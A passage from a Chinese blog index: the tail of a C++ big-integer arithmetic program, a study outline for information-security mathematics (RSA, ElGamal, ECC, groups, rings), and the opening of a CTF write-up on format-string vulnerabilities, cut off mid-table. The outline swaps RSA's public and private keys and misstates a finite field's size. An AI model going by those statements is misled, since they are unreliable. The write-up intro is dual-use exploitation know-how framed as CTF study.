class="line">BigInt <span class="keyword">operator</span> - (BigInt a, BigInt b)&#123;</span><br><span class="line">	BigInt BI;</span><br><span class="line">	<span class="keyword">if</span>(a.neg == b.neg)&#123;</span><br><span class="line">		<span class="keyword">if</span>(absolute_cmp(a, b))</span><br><span class="line">			<span class="keyword">return</span> -(b-a);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		b = -b;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	BI.neg = a.neg;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="built_in">pow</span>(<span class="number">10</span>, Digit_Per_Num);</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, ci = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(a.n &gt;= i || b.n &gt;= i)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a.n &lt; i) a.num[i] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(b.n &lt; i) b.num[i] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		BI.num[i] = a.num[i] - b.num[i] + ci;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(BI.num[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			BI.num[i] += mod;</span><br><span class="line">			ci = <span class="number">-1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> ci = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		BI.n = i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// to cut off leading zero(s)</span></span><br><span class="line">	pushdown(BI);</span><br><span class="line">	pushup(BI);</span><br><span class="line">	<span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> * (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="function">BigInt <span class="title">BI</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(absolute_cmp(b, a))</span><br><span class="line">		<span class="keyword">return</span> b * a;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= a.n; i++)&#123;</span><br><span class="line">		BigInt t = b;</span><br><span class="line">		t.neg = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> p = a.num[i];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= b.n; j++)</span><br><span class="line">			t.num[j] *= p;</span><br><span class="line">		pushup(t);</span><br><span class="line"></span><br><span class="line">		t = t &lt;&lt; i;</span><br><span class="line">		BI = BI + t;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	BI.neg = a.neg != b.neg;</span><br><span class="line">	pushup(BI);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> / (BigInt a, BigInt b)&#123;</span><br><span class="line">	BigInt q;</span><br><span class="line">	<span class="keyword">const</span> BigInt ZERO;</span><br><span class="line">	<span class="keyword">if</span>(b == ZERO)</span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"Division by zero condition!"</span>;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">// if a &lt; b</span></span><br><span class="line">	<span class="keyword">if</span>(absolute_cmp(a, b))</span><br><span class="line">		<span class="keyword">return</span> ZERO;</span><br><span class="line">	</span><br><span class="line">	q.neg = a.neg != b.neg;</span><br><span class="line">	a.neg = b.neg = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">1</span>; </span><br><span class="line">	BigInt t = b &lt;&lt; (a.n - b.n);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(a &gt;= t)&#123;</span><br><span class="line">			<span class="keyword">if</span>(flag)&#123;</span><br><span class="line">				q.n = t.n - b.n;</span><br><span class="line">				flag = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= q.n; i++)</span><br><span class="line">					q.num[i] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			q.num[t.n - b.n]++;</span><br><span class="line">			a = a - t;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>((a.n == b.n &amp;&amp; a.num[a.n] &lt; b.num[b.n]) || a.n &lt; b.n)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">			</span><br><span class="line">		t = t &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> % (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">return</span> a - (a/b)*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.neg != b.neg)</span><br><span class="line">		<span class="keyword">return</span> a.neg == <span class="literal">true</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(a.neg == <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> absolute_cmp(a, b);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> !absolute_cmp(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">return</span> !(a&lt;b) &amp;&amp; a!=b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">return</span> a.neg==b.neg &amp;&amp; !absolute_cmp(a,b) &amp;&amp; !absolute_cmp(b,a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> != (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">return</span> !(a==b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">return</span> !(a&gt;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="keyword">return</span> !(a&lt;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> &lt;&lt; (BigInt a, <span class="keyword">int</span> b)&#123;</span><br><span class="line">	<span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">		</span><br><span class="line">	BigInt BI;</span><br><span class="line">	BI.neg = a.neg;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= a.n; i++)</span><br><span class="line">		BI.num[i+b] = a.num[i];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= b<span class="number">-1</span>; i++)</span><br><span class="line">		BI.num[i] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">	BI.n = a.n + b;</span><br><span class="line">	<span class="keyword">return</span> BI;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> &gt;&gt; (BigInt a, <span class="keyword">int</span> b)&#123;</span><br><span class="line">	<span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	<span class="function">BigInt <span class="title">BI</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//result is 0</span></span><br><span class="line">	<span class="keyword">if</span>(b &gt;= a.n + <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> BI;</span><br><span class="line">	</span><br><span class="line">	BI.neg = a.neg;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = b; i &lt;= a.n; i++)</span><br><span class="line">		BI.num[i-b] = a.num[i];</span><br><span class="line">	</span><br><span class="line">	BI.n = a.n - b;</span><br><span class="line">	<span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// to judge if |a| &lt; |b|</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">absolute_cmp</span><span class="params">(BigInt a, BigInt b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.n != b.n)</span><br><span class="line">		<span class="keyword">return</span> a.n &lt; b.n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = a.n; i+<span class="number">1</span>; i--)</span><br><span class="line">		<span class="keyword">if</span>(a.num[i] != b.num[i])</span><br><span class="line">			<span class="keyword">return</span> a.num[i] &lt; b.num[i];</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BigInt <span class="title">pushup</span><span class="params">(BigInt &amp;a)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.n == <span class="number">0</span> &amp;&amp; a.num[<span class="number">0</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		a.neg = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> mod = <span class="built_in">pow</span>(<span class="number">10</span>, Digit_Per_Num);</span><br><span class="line">	<span class="keyword">int</span> ci = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= a.n; i++)&#123;</span><br><span class="line">		a.num[i] += ci;</span><br><span class="line">		ci = a.num[i] / mod;</span><br><span class="line">		a.num[i] %= mod; 		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(ci)</span><br><span class="line">		a.num[++a.n] = ci;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">// to cut off leading zero(s)</span></span><br><span class="line">	pushdown(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BigInt <span class="title">pushdown</span><span class="params">(BigInt &amp;a)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = a.n;</span><br><span class="line">	<span class="keyword">while</span>(i)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a.num[i--] == <span class="number">0</span>)</span><br><span class="line">			a.n--;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BigInt <span class="title">pow</span><span class="params">(BigInt x, BigInt y, BigInt mod)</span></span>&#123;</span><br><span class="line">	BigInt base = x % mod;</span><br><span class="line">	<span class="function">BigInt <span class="title">r</span><span class="params">(<span class="string">"1"</span>)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">const</span> BigInt <span class="title">ZERO</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">const</span> BigInt <span class="title">TWO</span><span class="params">(<span class="string">"2"</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(y != ZERO)&#123;</span><br><span class="line">		<span class="keyword">if</span>(y.num[<span class="number">0</span>] &amp; <span class="number">1</span>) r = (r * base) % mod;</span><br><span class="line">		base = (base * base) % mod;</span><br><span class="line">		y = y / TWO;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"please input a:"</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">	<span class="function">BigInt <span class="title">a</span><span class="params">(s)</span></span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"please input b:"</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">	<span class="function">BigInt <span class="title">b</span><span class="params">(s)</span></span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"you just input:"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"a =     "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"b =     "</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"a + b = (binary) "</span> &lt;&lt; (a + b).to_binary_string() &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"a - b = "</span> &lt;&lt; a - b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"a * b = "</span> &lt;&lt; a * b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"a / b = "</span> &lt;&lt; a / b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"remainder:"</span> &lt;&lt; a - (a/b)*b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="comment">//cout &lt;&lt; "a / b = " &lt;&lt; "0" &lt;&lt; endl &lt;&lt; "remainder:" &lt;&lt; "123456789" &lt;&lt; endl;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"please input x, y, m which stands for x^y mod m:"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">	<span class="function">BigInt <span class="title">x</span><span class="params">(s)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">	<span class="function">BigInt <span class="title">y</span><span class="params">(s)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">	<span class="function">BigInt <span class="title">m</span><span class="params">(s)</span></span>;</span><br><span class="line">	</span><br><span class="line">	BigInt ans = <span class="built_in">pow</span>(x, y, m);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">"answer:"</span> &lt;&lt;  ans &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">"answer:(binary)"</span> &lt;&lt;  ans.to_binary_string() &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/99d2d0ad/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/99d2d0ad/" class="post-title-link" itemprop="url">信息安全数学基础复习提纲</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-01-04 15:57:34" itemprop="dateCreated datePublished" datetime="2020-01-04T15:57:34+08:00">2020-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-01-05 15:53:59" itemprop="dateModified" datetime="2020-01-05T15:53:59+08:00">2020-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/notes/" itemprop="url" rel="index">
                    <span itemprop="name">notes</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="信息安全数学复习"><a href="#信息安全数学复习" class="headerlink" title="信息安全数学复习"></a>信息安全数学复习</h1><h2 id="初等数论复习"><a href="#初等数论复习" class="headerlink" title="初等数论复习"></a>初等数论复习</h2><ol>
<li><h3 id="整除"><a href="#整除" class="headerlink" title="整除"></a>整除</h3><p>1.1 整除</p>
<p>1.2 带余除法</p>
<p>1.3 最大公因数（最小公倍数）</p>
<p>​    1.3.1 辗转相除法 gcd()</p>
<p>​    1.3.2 欧几里得算法 ax+by=gcd(a,b)</p>
<p>1.4 素数</p>
<p>​    1.4.1 算数基本定理 任何一个数都可以由若干个素数的乘积表示出来</p>
<p>​    1.4.2 大整数分解，是非常困难的</p>
</li>
<li><h3 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h3><p>2.1 等价关系 +，-，×， (÷ 只有转化为×逆元，用扩展欧几里得算法寻找逆元)</p>
<p>2.2 剩余类  (比如mod  N )  </p>
<p>​    2.2.1 完全剩余系 Zn  |Zn|=n</p>
<p>​        2.2.1.1 x,(a,m)  构造  ax+b</p>
<p>​        2.2.1.2 m1-&gt;x m2-&gt;y, 构造 m1y+m2x  (m1m2)</p>
<p>​    2.2.2 简化剩余系 Z*n  |Z *n|=   φ(n)</p>
<p>​        2.2.2.1 x,(a,m) 构造 ax</p>
<p>​        2.2.2.2  和 2.2.1.2类似       </p>
<p>​                也就能够推出 φ(n*m) = φ(n) * φ(m)</p>
<p>​                以及 欧拉定理  a∈Zn, (a,N)＝1    a^φ(N) = 1        </p>
<p>​    2.2.3 RSA算法（查看ppt）</p>
<p>​            了解rsa的加密和解密的步骤就ok了</p>
<p>​            2.2.3.1 密钥生成</p>
<p>​                    p q   n = p*q</p>
<p>​                    φ(n) = Z  = (p-1)(q-1)</p>
<p>​            (e,φ(n))=1    e*d=1(mod(φ(n)))    </p>
<p>​            (n,e)  是私钥    (n,d)是公钥 ，利用扩展欧几里得算法算出</p>
<p>2.3 同余方程</p>
<p>​    一次同余方程 ax =b (mod m)</p>
<p>​    一次同余方程组 </p>
<p>​        中国剩余定理  模数m的拆分</p>
</li>
</ol>
<h2 id="抽象（近世）代数"><a href="#抽象（近世）代数" class="headerlink" title="抽象（近世）代数"></a>抽象（近世）代数</h2><h3 id="群"><a href="#群" class="headerlink" title="群"></a>群</h3><ol>
<li><p>定义： 给定一个集合，这个集合封闭，结合，有单位元，逆元   (Zn,+) (Z*n, ×)</p>
</li>
<li><p>指数运算 </p>
<p>n*g = g+g+g++g+g</p>
<p>g^n = g * g * … * g</p>
</li>
<li><p>子群</p>
<p>(Z*7 mod(7))  {1,2,4} {1,6}  {1,2,3,4,5,6,7}</p>
<p>证明方法 ab^-1 ∈ H</p>
</li>
<li><p>正规子群、陪集、商群、群同态基本定理</p>
<p>​    4.1 正规子群 可以交换</p>
<p>​    4.2 陪集 aH    </p>
<p>​                1 {1,6} = {1,6} = 6 {1,6}</p>
<p>​                2 {1,6} = {2,5} = 5 {1,6}</p>
<p>​                3 {1,6} = {3,4} = 4 {1,6}</p>
<p>​    4.3 商群  所有陪集里面一个元素作为单位元，其他陪集之间都存在互为逆元的关系</p>
<p>​    4.4 群同态的基本定理 </p>
<p>​        利用核和原群  可形成商群 G/N 与G‘ 同构 ，要学会举例并证明</p>
<p>​        f(x) = 3^x  (mod 7) ，3是一个生成元，构成满射</p>
<p>​            x =0 f(x) = 1</p>
<p>​            x = 6,12, 18…. f(x) = 1</p>
<p>​            6Z 就是核</p>
<p>​            Z/6Z 形成的商群 ，与 {Z*7 , ×(mod 7)} 同构</p>
</li>
<li><p>​    循环群</p>
<p>第一个生成元、其他生成元、子群推生成元</p>
<p> {Z*n , ×mod(n)}  |Z *n| = 10 = 2 *5</p>
<p>​    先找到第一个生成元（怎么找？）  a    a^n是生成元  (n,k) = 1  就可找出所有生成元 要会<strong>证明</strong>并且应用</p>
<p>​    2^0=1  <strong>2^1=2</strong>  <strong>2^3 = 8</strong>  2^4 = 5  2^5 =10  2^6 = 9  <strong>2^7 = 7</strong> 2^8 = 3  <strong>2^9 =6</strong></p>
<p>​    2^k ，找与n(10) 互素的 k  </p>
<p>​    </p>
<p>找子群</p>
<p>​    10的因子有 1,2,5,10   ，那么就有四个子群，这四个子群的元素个数分别为1，2，5，10</p>
<p>​    (拉格朗日定理 |G| = |H| [G:H])</p>
</li>
</ol>
<p>​                    (g,h)-&gt;x    g^x = h 离散对数问题，是困难的</p>
<p>​            6. el-gammel算法</p>
<p>p, Z*p  ,g  , x,  h = g^x</p>
<p>c1  = g^k   c2 = m 异或 h^k</p>
<p>c2 异或 c1^x</p>
<p>m 异或 h ^k 异或 g^kx</p>
<p>g^xk = g^kx </p>
<h3 id="环和域"><a href="#环和域" class="headerlink" title="环和域"></a>环和域</h3><ol>
<li>环的定义：集合  交换加群，封闭，结合，满足分配律 ，整环</li>
</ol>
<p>​            零因子 {Z12,+,×}    3 != 0, 4!=0    但3*4=0</p>
<p>​            除环： 有单位元、非零元、非零元能找到逆元（即交换加群、成群、分配律）</p>
<p>​            整环：单位元、交换、无零因子   {Z,+,×}可以， 但是{2Z,+,×}不行，因为没有单位元</p>
<p>​            域：交换除环， {Zp,+,×}，p为素数的时候可以形成域</p>
<p>​                    有限整环</p>
<ol start="2">
<li><p>子环、理想、商环</p>
<p>​    {Z12, +, ×}</p>
<p>子环    {0,3,6,9} ，它还是一个理想，因为其他所有的子环×它的元素都被他吸收到这个环中了</p>
<p>商环  </p>
</li>
</ol>
<h3 id="多项式环与有限域"><a href="#多项式环与有限域" class="headerlink" title="多项式环与有限域"></a>多项式环与有限域</h3><p>多项式的除法求余</p>
<p>辗转相除法求多项式的最大公因式</p>
<p>GF(2)[x] mod (x^2 + x + 1) 形成一个有限域，共包含 2^3 个数,{0,1,x,x+1,x^2+1, x^2+x+1, x^2 +x}</p>
<p>同样的，寻找子域</p>
<h2 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h2><ol>
<li><p>实数域上的椭圆曲线</p>
<p>y^2 = x^3 + ax + b</p>
<p>P(x1,y1) Q(x2,y2)  P + Q (x3,y3)</p>
<p>λ = (y2-y1)/(x2-x1)  P!=Q</p>
<p>​      (3* x1^2 + a) / (2 * y1)  P = Q</p>
<p>x3 = λ² - x1 - x2</p>
<p>y3 = λ(x1-x3) -y1 </p>
</li>
</ol>
<ol start="2">
<li><p>有限域</p>
<p>以上所有的运算mod p</p>
</li>
</ol>
<ol start="3">
<li><p>ECC</p>
<p>算法步骤</p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/44593ed6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/44593ed6/" class="post-title-link" itemprop="url">NCTF2019_pwn2心得 & 格式化字符串总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2019-11-26 08:57:45 / Modified: 22:13:53" itemprop="dateCreated datePublished" datetime="2019-11-26T08:57:45+08:00">2019-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-up/" itemprop="url" rel="index">
                    <span itemprop="name">write-up</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-up/nctf20191124/" itemprop="url" rel="index">
                    <span itemprop="name">nctf20191124</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>字符串泄露，顾名思义，就是利用一串格式化字符串，来达到泄露程序数据、修改内存数据的目的</p>
<p> <a href="https://zh.wikipedia.org/wiki/格式化字符串" target="_blank" rel="noopener">详细文档</a> </p>
<p>==%[parameter] [flags] [field width] [.precision] [length] type==</p>
<ol>
<li><p><strong>parameter</strong></p>
<p>用法：<strong>n$</strong>，表示选择第几个参数，在格式化字符串题目中尤为重要，可以跨参数读取数据</p>
</li>
<li><p><strong>flag</strong></p>
<p>见文档</p>
</li>
<li><p><strong>Field Width</strong></p>
</li>
<li><p><strong>Precision</strong> </p>
</li>
<li><p><strong>Length</strong> </p>
<p>指要输出的数据的长度，规定数据的尺寸</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>hh</code></td>
<td align="center">对于整数类型，<code>printf</code> 会输出<strong>一个</strong>字节长度的数据</td>
</tr>
<tr>
<td align="center"><code>h</code></td>
<td align="center">对于整数类型，<code>printf</code> 会输出<strong>两个</strong>字节长度的数据</td>
</tr>
<tr>
<td align="center"><code>l</code></td>
<td align="center">对于整数类型，<code>printf</code> 会输出<strong>四个</strong>字节长度的数据</td>
</tr>
<tr>
<td align="center"><code>ll</code></td>
<td align="center">对于整数类型，<code>printf</code> 会输出<strong>八个</strong>字节长度的数据</td>
</tr>
</tbody></table>
<ol start="6">
<li><p><strong>Type</strong> </p>
<p>对应的是要输出的数据的数据类型，格式</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>d</code>, <code>i</code></td>
<td align="center">有符号十进制数值<code>int</code>。’<code>%d</code>‘与’<code>%i</code>‘对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td align="center"><code>u</code></td>
<td align="center">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td align="center"><code>f</code>, <code>F</code></td>
<td align="center"><code>double</code>型输出10进制<a href="https://zh.wikipedia.org/wiki/定點" target="_blank" rel="noopener">定点</a>表示。’<code>f</code>‘与’<code>F</code>‘差异是表示无穷与NaN时，’<code>f</code>‘输出’<code>inf</code>‘, ‘<code>infinity</code>‘与’<code>nan</code>‘；’<code>F</code>‘输出’<code>INF</code>‘, ‘<code>INFINITY</code>‘与’<code>NAN</code>‘。小数点后的数字位数等于精度，最后一位数字<a href="https://zh.wikipedia.org/wiki/四舍五入" target="_blank" rel="noopener">四舍五入</a>。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td>
</tr>
<tr>
<td align="center"><code>e</code>, <code>E</code></td>
